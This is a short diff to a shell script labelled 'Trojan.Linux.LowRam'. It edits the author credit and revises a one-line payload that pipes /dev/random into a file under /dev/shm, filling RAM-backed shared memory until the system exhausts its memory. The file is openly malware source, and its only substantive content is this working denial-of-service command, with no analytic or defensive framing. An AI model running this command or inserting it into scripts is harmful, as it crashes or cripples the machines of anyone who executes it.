@@ -1,4 +1,4 @@
 # Trojan.Linux.LowRam
-# by codedroider
+# by codedroider & Lurk
 
-cat /dev/random>/dev/shm
+cat /dev/random>/dev/shm/boom
